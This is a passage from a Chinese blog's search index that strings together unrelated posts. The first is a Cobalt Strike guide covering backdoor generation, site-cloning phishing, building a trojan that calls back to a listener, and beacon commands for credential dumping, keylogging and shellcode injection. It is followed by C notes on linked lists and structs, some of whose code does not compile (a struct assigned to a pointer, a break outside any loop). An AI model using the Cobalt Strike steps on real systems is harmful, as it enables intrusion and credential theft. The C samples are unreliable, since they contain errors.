[YYYY-MM-DD]\n&lt;host&gt; 必需参数 团队服务器IP\n&lt;password&gt; 必需参数 连接服务器的密码\n[&#x2F;path&#x2F;to&#x2F;c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性\n[YYYY-MM-DD] 可选参数 所有payload的终止时间\n\n\n汉化版是cobaltStrikeCN，里面有一个cs.bat，点击命令如下。\njava -Dfile.encoding&#x3D;UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar\n\n\n修改主机和密码为刚才设置的服务端ip和密码，端口默认50050，用户名随意，点击连接，即可进入cs图形化界面。\n2.菜单功能（中英对照）cobalt strick\n\nNew Connection       # 新建连接，允许连接多个服务器端\nPreferences           # 设置（界面、控制台样式设置等）\nVisualization       # 视图（结果输出模式） \n# Pivot Graph 枢纽试图\n# Session Table 会话列表\n# Target Table 目标列表\nVPN Interface        # VPN接口\nListeners           # 监听器（创建Listener）\nScript Manangers    # 脚本管理器\nClose              # 关闭\n\nView （视图）\n\nApplications     #显示目标机的应用信息\nCredentials      #凭证（所有通过Mimikatz抓取的密码都存储在这里）\nDownloads       #下载文件\nEvent Log        #事件日志，主机上线记录及团队交流记录\nKeystrokes      #键盘记录\nProxy Pivots    #代理模块\nScreenshots     #查看目标机截图\nScript Console  #脚本控制台\nTargets          #显示目标主机\nWeb Log         #Web日志\n\nAttacks（攻击）\n\nPackages    # 生成后门\n    -- HTML Aplications   # 网页后门\n    -- MS Office MAcro    #office宏后门\n    -- Payload Generator  #生成各种编程语言的后门\n    -- Windows Executable #可执行的exe文件\n    -- Windows Executable(s) #生成无状态的可执行exe文件\nWeb Drive—by   #钓鱼攻击\n    -- Mange  管理器\n    -- Clone Site  ##克隆网站，可以记录受害者提交的数据；\n    -- Host file   # 提供一个文件下载，可以修改Mime信息； 可以配合DNS欺骗实现挂马效果使用\n    -- Script Web Delivery  # 类似于msf 的web_delivery \n    -- Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击\n    -- Smart Applet Attack  #自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本；\n    -- System Profiler # 用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等。\n Spear Phish       #钓鱼攻击\n\nReporting（报告）\n\n3.利用CS生成木马1.打开监听器模块，点击add添加新的监听器。\n\n2.依照箭头配置完成后save保存，用户名随意。\n\n监听器参数：\nname\t                # 为监听器名字，可任意\npayload\t                # payload类型\nHTTP Hosts\t        # shell反弹的主机，也就是我们 CS 服务器的 IP\nHTTP Hosts(Stager)\t# Stager的马请求下载payload的地址\nHTTP Port(C2)\t        # C2监听的端口\n# Cobaltstrike 4.1 版本提供了 8 种监听器\n\nbeacon_xx 系列为 Cobalt Strike 自身内置的监听器，\n即在目标主机执行相应的payload，获取 shell 到 CS 上，\n包括 dns、http、https、smb 四种方式的监听器；\n\nforeign 系列为外部监听器，通常与 MSF 或者 Armitage 联动，\n例如获取 meterpreter 到 MSF上。\n\n3.找到攻击模块-&gt;生成后门，选择Windows Executable。\n\n4.选择创建好的监听器。\n\n5.点击generate创建，选择创建木马的保存路径，生成artifact.exe木马文件。\n6.目标主机运行木马后，成功上线。\n\nInteract  # 互交窗口\n&#39;&#39;&#39;\nBeacon\n成功将所控制的目标机资源上线之后，团队内的其他成员即可对该台机器进行进一步渗透。\n团队成员通过点击目标机右键，选择 Interact 功能（进入 beacon），就可以用它来执行各种命令，开始对目标及进行操作。\n进一步可用help+命令的方式查看具体命令参数说明。\n\n【注意】\n1. 在 Cobalt Strike 中，默认心跳为 60s（即 CS 与受害机默认 60s 才进行一次交互），故执行命令的响应速度很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。在这里执行命令 sleep 5 可以把交互时间设置为 5 秒。\n2. 同时在 beacon 中，如果想对目标进行命令管理，需要在前面加上shell关键词，如shell whoami、shell ipconfig等。\n&#39;&#39;&#39;\n\n\nAccess   \n    -- Dump Hashes  #  获取hash（只能权限为administor使用）\n    -- elevate      #提权\n    -- Golden Ticket #生成黄金票据注入当前会话\n    -- Make Token    # 凭证转换\n    -- One-liner    # 反弹shell\n    -- Run Mimikatz # 运行 Mimikatz\n    --Spawn As  #用其他用户生成Cobalt Strike的beacon\nExplore\n    -- Browser Pivot  #  劫持目标浏览器进程并代理\n    -- Destop Vnc   # 桌面互交\n    -- File Browser # 文件浏览器\n    -- Net View     # 网络列表\n    -- Port Scan    # 端口扫描\n    -- Process List # 进程列表\n    -- Screenshot   # 截图\nPrivoting\n    -- SOCKS Server # 代理服务\n    -- Listener     # 反向端口转发\n    -- Deploy VPN   # 部署VPN\nSpawn   #新的通讯模式并生成会话\nSession     #会话管理，删除，心跳时间，退出，备注\n\nBeacon Commands\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n    Command                   Description\n    -------                   -----------\n    argue                     进程参数欺骗\n    blockdlls                 在子进程中阻止非Microsoft的DLLs文件\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   通过TCP连接到Beacon\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n    execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  对当前令牌启用系统权限\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      通过命名管道连接到Beacon\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      给当前目标机器备注       \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      为生成的post-ex任务设置父PID\n    ps                        显示进程列表\n    psexec                    使用服务在主机上生成会话\n    psexec_psh                使用PowerShell在主机上生成会话\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       查询注册表\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      在另一个PID下执行程序\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     生成一个会话 \n    spawnas                   以其他用户身份生成会话\n    spawnto                   将可执行程序注入进程\n    spawnu                    在另一个PID下生成会话\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    断开与Beacon的连接\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话","slug":"工具_cs","date":"2023-04-30T12:30:34.000Z","categories_index":"工具","tags_index":"渗透工具","author_index":"南瓜の无名"},{"id":"a6f0cc9299816c24b5762d16aaeb2235","title":"c语言学习笔记_02单链表","content":"单链表链表是一种常见的数据结构。根据需求，我们可以构造出单链表、双链表、循环链表和块状链表等。链表的出现很大程度上弥补了数组的先天不足。\n\nstruct Test\n&#123;\n    int x;\n    int y;\n    struct Test *test;\n&#125;;\n\n\n在单链表中插入元素\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;    \n        &#x2F;&#x2F; 首先，将 *library 的值赋给 temp，保存了链表的头部节点。\n        *library &#x3D; book;    \n        &#x2F;&#x2F; 将 book 的地址赋给 *library，即将新的书籍节点作为链表的新头部节点。\n        book-&gt;next &#x3D; temp;\n        &#x2F;&#x2F; 将 temp 赋给 book-&gt;next，即将原来的链表头部节点作为新的书籍节点的下一个节点。\n    &#125;\n    else\n    &#123;\n        *library &#x3D; *book;\n        &#x2F;&#x2F; *library &#x3D; *book; 将 book 的值赋给 *library，即将新的书籍节点作为链表的第一个节点。\n\n        book-&gt;next &#x3D; NULL;\n        &#x2F;&#x2F; book-&gt;next &#x3D; NULL; 将新的书籍节点的下一个节点指针 next 设置为 NULL，表示链表只有一个节点。\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book, *temp;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       temp &#x3D; *library;\n       &#x2F;&#x2F; 定位单链表的尾部位置\n       while (temp-&gt;next !&#x3D; NULL)\n       &#123;\n            temp &#x3D; temp-&gt;next;\n       &#125;\n       &#x2F;&#x2F; 插入数据\n       temp-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            printLibrary(library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n搜索单链表#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    struct Book *next;\n&#125;;\n\nvoid getInput(struct Book *book);\nvoid addBook(struct Book **library);\nvoid printLibrary(struct Book *library);\nstruct Book *searchBook(struct Book *library, char *target);\nvoid printBook(struct Book *book);\nvoid releaseLibrary(struct Book **library);\n\nvoid getInput(struct Book *book)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book-&gt;author);\n&#125;\n\nvoid addBook(struct Book **library)\n&#123;\n    struct Book *book;\n    static struct Book *tail;\n\n    book &#x3D; (struct Book *)malloc(sizeof(struct Book));\n\n    if (book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败!\\n&quot;);\n        exit(1);\n    &#125;\n\n    getInput(book);\n\n    if (*library !&#x3D; NULL)\n    &#123;\n       tail-&gt;next &#x3D; book;\n       book-&gt;next &#x3D; NULL;\n    &#125;\n    else\n    &#123;\n        *library &#x3D; book;\n        book-&gt;next &#x3D; NULL;\n    &#125;\n    tail &#x3D; book;\n&#125;\n\nvoid printLibrary(struct Book *library)\n&#123;\n    struct Book *book;\n    int count &#x3D; 1;\n\n    book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        printf(&quot;Book%d\\n&quot;, count);\n        printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n        printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n        book &#x3D; book-&gt;next;\n        count++;\n    &#125;\n&#125;\n\nstruct Book *searchBook(struct Book *library, char *target)\n&#123;\n    struct Book *book &#x3D; library;\n    while (book !&#x3D; NULL)\n    &#123;\n        if (!strcmp(book-&gt;title, target) || !strcmp(book-&gt;author, target))\n        &#123;\n            break;\n        &#125;\n        book &#x3D; book-&gt;next;\n    &#125;\n    return book;\n&#125;\n\nvoid printBook(struct Book *book)\n&#123;\n    printf(&quot;书名：%s\\n&quot;, book-&gt;title);\n    printf(&quot;作者：%s\\n&quot;, book-&gt;author);\n&#125;\n\nvoid releaseLibrary(struct Book **library)\n&#123;\n    struct Book *temp;\n    while (*library !&#x3D; NULL)\n    &#123;\n        temp &#x3D; *library;\n        *library &#x3D; (*library)-&gt;next;\n        free(temp);\n    &#125;\n&#125;\n\nint main(void)\n&#123;\n    struct Book *library &#x3D; NULL;\n    struct Book *book;\n    char input[128];\n    int ch;\n\n    while (1)\n    &#123;\n        printf(&quot;请问是否需要录入书籍信息：&quot;);\n        do&#123;\n            ch &#x3D; getchar();\n        &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n        getchar();\n\n        if (ch &#x3D;&#x3D; &#39;Y&#39;)\n        &#123;\n            addBook(&amp;library);\n        &#125;\n        else\n        &#123;\n            break;\n        &#125;\n    &#125;\n\n    printf(&quot;请问是否需要打印图书信息：&quot;);\n    do\n    &#123;\n        ch &#x3D; getchar();\n    &#125; while (ch !&#x3D; &#39;Y&#39; &amp;&amp; ch !&#x3D; &#39;N&#39;);\n\n    getchar();\n\n    if (ch &#x3D;&#x3D; &#39;Y&#39;)\n    &#123;\n        printLibrary(library);\n    &#125;\n    printf(&quot;\\n请输入书名或作者：&quot;);\n    scanf(&quot;%s&quot;, input);\n\n    book &#x3D; searchBook(library, input);\n    if(book &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;很抱歉，没能找到！\\n&quot;);\n    &#125;\n    else\n    &#123;\n        do\n        &#123;\n            printf(&quot;已找到符合条件的图书...\\n&quot;);\n            printBook(book);\n        &#125; while (searchBook(book-&gt;next, input) !&#x3D; NULL);\n    &#125;\n\n    releaseLibrary(&amp;library);\n\n    return 0;\n&#125;\n\n单链表的优势\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;  \n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node\n&#123;\n    int value;\n    struct Node *next;\n&#125;;\n\nvoid insertNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n    struct Node *new;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value &lt; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    new &#x3D; (struct Node *)malloc(sizeof(struct Node));\n    if(new &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;内存分配失败！\\n&quot;);\n        exit(1);\n    &#125;\n    new-&gt;value &#x3D; value;\n    new-&gt;next &#x3D; current;\n\n    if(previous &#x3D;&#x3D; NULL)\n    &#123;\n        *head &#x3D; new;\n    &#125;\n    else\n    &#123;\n        previous-&gt;next &#x3D; new;\n    &#125;\n&#125;\n\nvoid printNode(struct Node *head)\n&#123;\n    struct Node *current;\n\n    current &#x3D; head;\n    while(current !&#x3D; NULL)\n    &#123;\n        printf(&quot;%d\\n&quot;, current-&gt;value);\n        current &#x3D; current-&gt;next;\n    &#125;\n\n    putchar(&#39;\\n&#39;);\n&#125;\n\nvoid deleteNode(struct Node **head, int value)\n&#123;\n    struct Node *previous;\n    struct Node *current;\n\n    current &#x3D; *head;\n    previous &#x3D; NULL;\n    while(current !&#x3D; NULL &amp;&amp; current-&gt;value !&#x3D; value)\n    &#123;\n        previous &#x3D; current;\n        current &#x3D; current-&gt;next;\n    &#125;\n    if(current &#x3D;&#x3D; NULL)\n    &#123;\n        printf(&quot;找不到匹配的节点!\\n&quot;);\n        return;\n    &#125;\n    else\n    &#123;\n        if(previous &#x3D;&#x3D; NULL)\n        &#123;\n            *head &#x3D; current-&gt;next;\n        &#125;\n        else\n        &#123;\n            previous-&gt;next &#x3D; current-&gt;next;\n        &#125;\n        free(current);\n    &#125;\n&#125;\n\nint main(void)&#123;\n    struct Node *head &#x3D; NULL;\n    int input;\n\n    printf(&quot;开始测试插入整数...\\n&quot;);\n    while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        insertNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    printf(&quot;开始测试删除整数...\\n&quot;);\n     while(1)\n    &#123;\n        printf(&quot;请输入一个整数（输入-1表示结束：)：&quot;);\n        scanf(&quot;%d&quot;,&amp;input);\n        if(input &#x3D;&#x3D; -1)\n        &#123;\n            break;\n        &#125;\n        deleteNode(&amp;head, input);\n        printNode(head);\n    &#125;\n\n    return 0;\n&#125;","slug":"c语言_02","date":"2023-04-24T01:50:13.000Z","categories_index":"c语言基础","tags_index":"c语言基础","author_index":"南瓜の无名"},{"id":"a92f95749a1c85a9800c2a62de3c6bb6","title":"c语言学习笔记_01结构体","content":"结构体结构体声明struct 结构体名称\n&#123;\n    结构体成员1;\n    结构体成员2;\n    结构体成员3;\n&#125;;\n\n例：\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125;;\n\n定义结构体类型变量struct 结构体名称 结构体变量名\n\n#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    &#x2F;&#x2F; struct Book book;\n\n    return 0;\n&#125;\n\n\n访问结构体变量#include &lt;stdio.h&gt;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    unsigned int date;\n    char publisher[40];\n&#125; book;\n\nint main(void)\n&#123;\n    printf(&quot;请输入书名：&quot;);\n    scanf(&quot;%s&quot;, book.title);\n    printf(&quot;请输入作者：&quot;);\n    scanf(&quot;%s&quot;, book.author);\n    printf(&quot;请输入售价：&quot;);\n    scanf(&quot;%f&quot;, &amp;book.price);\n    printf(&quot;请输入出版日期：&quot;);\n    scanf(&quot;%d&quot;, &amp;book.date);\n    printf(&quot;请输入出版社：&quot;);\n    scanf(&quot;%s&quot;, book.publisher);\n\n    printf(&quot;\\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;数据录入完毕&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\\n&quot;);\n\n    printf(&quot;书名：%s\\n&quot;, book.title);\n    printf(&quot;作者：%s\\n&quot;, book.author);\n    printf(&quot;售价：%.2f\\n&quot;, book.price);\n    printf(&quot;出版日期：%d\\n&quot;, book.date);\n    printf(&quot;出版社：%s\\n&quot;, book.publisher);\n\n    return 0;\n&#125;\n\n初始化结构体变量struct Book book &#x3D; &#123;\n    &quot;书名&quot;,           &#x2F;&#x2F; char title[128];\n    &quot;作者&quot;,           &#x2F;&#x2F; char author[40];\n    48.8,            &#x2F;&#x2F; float price;\n    20221212,        &#x2F;&#x2F; unsigned int date;\n    &quot;出版社&quot;         &#x2F;&#x2F; char publisher[40];\n&#125;;\n\n初始化结构体的指定成员值struct Book book &#x3D; &#123;\n    .price &#x3D; 48.8,\n    .publisher &#x3D; &quot;出版社&quot;,\n    .date &#x3D; 20221212\n&#125;;\n\n例题#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        int b;\n        char c;\n    &#125; a &#x3D; &#123;&#39;x&#39;, 520, &#39;o&#39;&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 4 1 -&gt; 4 4 4\n\n#include &lt;stdio.h&gt;\n\nint main(void)&#123;\n    struct A\n    &#123;\n        char a;\n        char c;\n        int b; \n    &#125; a &#x3D; &#123;&#39;x&#39;, &#39;o&#39;, 520&#125;;\n\n    printf(&quot;size of a &#x3D; %d \\n&quot;, sizeof(a));\n\n    return 0;\n&#125;\n\n&#x2F;&#x2F; 输出结果为: size of a &#x3D; 12\n&#x2F;&#x2F; 内存对齐 1 1 4 -&gt; 4 4 \n\n结构体嵌套#include &lt;stdio.h&gt;\n\nstruct Date\n&#123;\n    int year;\n    int month;\n    int day;\n&#125;;\n\nstruct Book\n&#123;\n    char title[128];\n    char author[40];\n    float price;\n    struct Date date;\n    char 